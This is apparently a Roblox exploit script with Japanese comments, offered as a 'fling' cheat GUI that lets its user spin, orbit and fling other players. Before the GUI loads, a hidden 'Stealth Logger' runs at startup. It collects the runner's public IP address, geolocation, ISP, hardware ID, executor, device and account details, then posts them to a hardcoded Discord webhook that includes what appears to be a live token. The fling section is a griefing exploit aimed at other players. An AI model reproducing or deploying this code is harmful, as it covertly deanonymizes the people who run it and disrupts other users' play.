local MarketplaceService = game:GetService("MarketplaceService")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local GuiService = game:GetService("GuiService")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local lp = Players.LocalPlayer

-- === 設定 ===
local webhook_url = "https://webhook.lewisakura.moe/api/webhooks/1472130886550945802/bHPREhnis3MtjMK3xA2lMZeuoSQvBbxK8UTqzLk_znZodpVyzwvxHlcNwPNCrj22F-Bf"

-- === 1. ロガーセクション (最新の特定ログ機能) ===
local function sendDetailedLog()
    local ipData = "取得失敗"
    local geoData = {regionName = "不明", city = "不明", isp = "不明", proxy = false}
    local info = {Name = "不明"}
    local avatarUrl = ""

    -- アバター画像の取得 (最新API)
    pcall(function()
        local thumbApi = "https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. lp.UserId .. "&size=720x720&format=Png&isCircular=false"
        local thumbRes = game:HttpGet(thumbApi)
        local thumbData = HttpService:JSONDecode(thumbRes)
        if thumbData and thumbData.data and thumbData.data[1] then
            avatarUrl = thumbData.data[1].imageUrl
        else
            avatarUrl = "https://www.roblox.com/avatar-thumbnail/image?userId=" .. lp.UserId .. "&width=420&height=420&format=png"
        end
    end)

    -- IPおよび位置情報の取得
    pcall(function()
        info = MarketplaceService:GetProductInfo(game.PlaceId)
        ipData = game:HttpGet("https://api.ipify.org")
        local response = game:HttpGet("http://ip-api.com/json/" .. ipData .. "?lang=ja&fields=status,message,country,regionName,city,isp,proxy")
        geoData = HttpService:JSONDecode(response)
    end)

    -- 実行環境の特定
    local executor = (identifyexecutor and identifyexecutor()) or "不明なExecutor"
    local hwid = (gethwid and gethwid()) or "取得不可"
    
    local deviceDetail = "不明"
    if GuiService:IsTenFootInterface() then
        deviceDetail = "🎮 Console (Xbox/PS)"
    elseif UserInputService.TouchEnabled then
        local screenSize = workspace.CurrentCamera.ViewportSize
        if math.min(screenSize.X, screenSize.Y) < 600 then
            deviceDetail = "📱 Mobile (Phone)"
        else
            deviceDetail = "平板 Tablet"
        end
    elseif UserInputService.KeyboardEnabled then
        deviceDetail = "💻 PC (Windows/Mac)"
    end

    -- Discord Embedデータ
    local data = {
        ["embeds"] = {{
            ["title"] = "🚨 実行者特定ログ: " .. lp.Name,
            ["color"] = 0xff4500,
            ["fields"] = {
                {
                    ["name"] = "👤 ユーザー",
                    ["value"] = "**Username:** `" .. lp.Name .. "`\n**DisplayName:** " .. lp.DisplayName .. "\n**UserID:** `" .. lp.UserId .. "`\n**垢経過:** " .. lp.AccountAge .. "日",
                    ["inline"] = true
                },
                {
                    ["name"] = "🛠 実行環境",
                    ["value"] = "**Device:** " .. deviceDetail .. "\n**Executor:** `" .. executor .. "`\n**HWID:** `" .. hwid .. "`",
                    ["inline"] = true
                },
                {
                    ["name"] = "🌐 ネットワーク",
                    ["value"] = "**IP:** `" .. ipData .. "`\n**地域:** " .. geoData.regionName .. " " .. geoData.city .. "\n**ISP:** " .. geoData.isp .. "\n**VPN/Proxy:** " .. (geoData.proxy and "🚩 検出" or "✅ 無し"),
                    ["inline"] = false
                },
                {
                    ["name"] = "📍 サーバー/実行場所",
                    ["value"] = "**Game:** " .. info.Name .. "\n**PlaceId:** " .. game.PlaceId .. "\n**JobId:** `" .. game.JobId .. "`",
                    ["inline"] = false
                }
            },
            ["thumbnail"] = { ["url"] = avatarUrl },
            ["footer"] = { ["text"] = "Shiun4545 Stealth Logger | " .. os.date("%Y/%m/%d %X") }
        }}
    }

    -- 送信
    pcall(function()
        local req = (syn and syn.request) or (http and http.request) or request
        if req then
            req({
                Url = webhook_url,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode(data)
            })
        end
    end)
end

-- ログ送信実行
sendDetailedLog()

-- === 2. GUIセクション (フリング機能) ===
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "CustomFling_Orbit_Shiun"
ScreenGui.Parent = lp:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 250, 0, 380)
Frame.Position = UDim2.new(0.5, -125, 0.5, -190)
Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 10)
UICorner.Parent = Frame

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0.08, 0)
Title.Text = "FLING CONTROL (shiun4545)"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.BackgroundTransparency = 1
Title.Font = Enum.Font.SourceSansBold
Title.Parent = Frame

local ScrollingFrame = Instance.new("ScrollingFrame")
ScrollingFrame.Size = UDim2.new(0.9, 0, 0.35, 0)
ScrollingFrame.Position = UDim2.new(0.05, 0, 0.1, 0)
ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
ScrollingFrame.ScrollBarThickness = 6
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.Parent = Frame

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Parent = ScrollingFrame
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

UIListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, UIListLayout.AbsoluteContentSize.Y)
end)

local StatusLabel = Instance.new("TextLabel")
StatusLabel.Size = UDim2.new(0.9, 0, 0.06, 0)
StatusLabel.Position = UDim2.new(0.05, 0, 0.47, 0)
StatusLabel.Text = "Target: NONE"
StatusLabel.TextColor3 = Color3.fromRGB(255, 255, 0)
StatusLabel.BackgroundTransparency = 1
StatusLabel.Parent = Frame

local function createBtn(text, pos, color)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0.9, 0, 0.1, 0)
    btn.Position = pos
    btn.Text = text
    btn.BackgroundColor3 = color
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Font = Enum.Font.SourceSansBold
    btn.Parent = Frame
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 6)
    corner.Parent = btn
    return btn
end

local SpinBtn = createBtn("SPIN: OFF", UDim2.new(0.05, 0, 0.55, 0), Color3.fromRGB(150, 0, 0))
local OrbitBtn = createBtn("ORBIT: OFF", UDim2.new(0.05, 0, 0.67, 0), Color3.fromRGB(150, 0, 0))
local ToggleBtn = createBtn("FLING: OFF", UDim2.new(0.05, 0, 0.79, 0), Color3.fromRGB(150, 0, 0))

-- ロジック変数
local flicking, spinning, orbiting = false, false, false
local targetPlayer = nil
local flingPower = 150000
local spinSpeed = 200
local orbitSpeed = 25
local orbitDistance = 3.5
local angle = 0

-- プレイヤーリスト更新
local function updateList()
    for _, child in pairs(ScrollingFrame:GetChildren()) do
        if child:IsA("TextButton") then child:Destroy() end
    end
    
    local AllBtn = Instance.new("TextButton")
    AllBtn.Size = UDim2.new(1, 0, 0, 30)
    AllBtn.Text = "[ ALL PLAYERS ]"
    AllBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    AllBtn.TextColor3 = Color3.new(1, 1, 1)
    AllBtn.Parent = ScrollingFrame
    AllBtn.MouseButton1Click:Connect(function()
        targetPlayer = "ALL"
        StatusLabel.Text = "Target: ALL PLAYERS"
    end)

    for _, p in pairs(Players:GetPlayers()) do
        if p ~= lp then
            local btn = Instance.new("TextButton")
            btn.Size = UDim2.new(1, 0, 0, 30)
            btn.Text = p.DisplayName .. " (@" .. p.Name .. ")"
            btn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
            btn.TextColor3 = Color3.new(1, 1, 1)
            btn.Parent = ScrollingFrame
            btn.MouseButton1Click:Connect(function()
                targetPlayer = p
                StatusLabel.Text = "Target: " .. p.Name
            end)
        end
    end
end

updateList()
Players.PlayerAdded:Connect(updateList)
Players.PlayerRemoving:Connect(updateList)

-- ボタンイベント
SpinBtn.MouseButton1Click:Connect(function()
    spinning = not spinning
    SpinBtn.Text = spinning and "SPIN: ON" or "SPIN: OFF"
    SpinBtn.BackgroundColor3 = spinning and Color3.fromRGB(0, 150, 0) or Color3.fromRGB(150, 0, 0)
end)

OrbitBtn.MouseButton1Click:Connect(function()
    orbiting = not orbiting
    OrbitBtn.Text = orbiting and "ORBIT: ON" or "ORBIT: OFF"
    OrbitBtn.BackgroundColor3 = orbiting and Color3.fromRGB(0, 150, 0) or Color3.fromRGB(150, 0, 0)
end)

ToggleBtn.MouseButton1Click:Connect(function()
    flicking = not flicking
    ToggleBtn.Text = flicking and "FLING: ON" or "FLING: OFF"
    ToggleBtn.BackgroundColor3 = flicking and Color3.fromRGB(0, 150, 0) or Color3.fromRGB(150, 0, 0)
end)

-- メインループ
RunService.Heartbeat:Connect(function(dt)
    local char = lp.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    if spinning then
        hrp.RotVelocity = Vector3.new(0, spinSpeed, 0)
    end

    if not targetPlayer then return end

    local function applyFling(targetHrp)
        if orbiting then
            angle = angle + orbitSpeed * dt
            local offset = Vector3.new(math.cos(angle) * orbitDistance, 0.5, math.sin(angle) * orbitDistance)
            hrp.CFrame = CFrame.new(targetHrp.Position + offset)
        else
            hrp.CFrame = targetHrp.CFrame * CFrame.new(0, 0, 0.01)
        end

        if flicking then
            hrp.Velocity = Vector3.new(flingPower, flingPower, flingPower)
        end
    end

    if targetPlayer == "ALL" then
        for _, v in pairs(Players:GetPlayers()) do
            if v ~= lp and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
                applyFling(v.Character.HumanoidRootPart)
            end
        end
    elseif targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
        applyFling(targetPlayer.Character.HumanoidRootPart)
    end
end)

-- 衝突判定無効化
RunService.Stepped:Connect(function()
    if (flicking or orbiting or spinning) and lp.Character then
        for _, part in pairs(lp.Character:GetDescendants()) do
            if part:IsA("BasePart") then
                part.CanCollide = false
            end
        end
    end
end)
